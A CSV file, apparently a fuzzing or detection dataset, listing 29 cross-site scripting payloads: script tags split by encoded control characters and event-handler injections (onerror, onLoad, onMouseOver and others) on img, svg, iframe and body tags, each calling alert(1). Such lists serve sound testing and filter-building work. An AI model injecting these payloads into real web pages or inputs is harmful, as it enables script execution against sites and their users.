,index,sentence
0,0,"<script\x20type=""text/javascript"">javascript:alert(1);</script>"
1,1,"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>"
2,2,"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>"
3,3,"<script\x09type=""text/javascript"">javascript:alert(1);</script>"
4,4,"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>"
5,5,"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>"
6,6,"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>"
7,7,"'`""><\x3Cscript>javascript:alert(1)</script>"
8,8,"'`""><\x00script>javascript:alert(1)</script>"
9,9,"<img src=1 href=1 onerror=""javascript:alert(1)""></img>"
10,10,"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>"
11,11,"<video src=1 href=1 onerror=""javascript:alert(1)""></video>"
12,12,"<body src=1 href=1 onerror=""javascript:alert(1)""></body>"
13,13,"<image src=1 href=1 onerror=""javascript:alert(1)""></image>"
14,14,"<object src=1 href=1 onerror=""javascript:alert(1)""></object>"
15,15,"<script src=1 href=1 onerror=""javascript:alert(1)""></script>"
16,16,"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>"
17,17,"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>"
18,18,"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>"
19,19,"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>"
20,20,"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>"
21,21,"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>"
22,22,"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>"
23,23,"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>"
24,24,"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>"
25,25,"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>"
26,26,"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>"
27,27,"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>"
28,28,"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>"
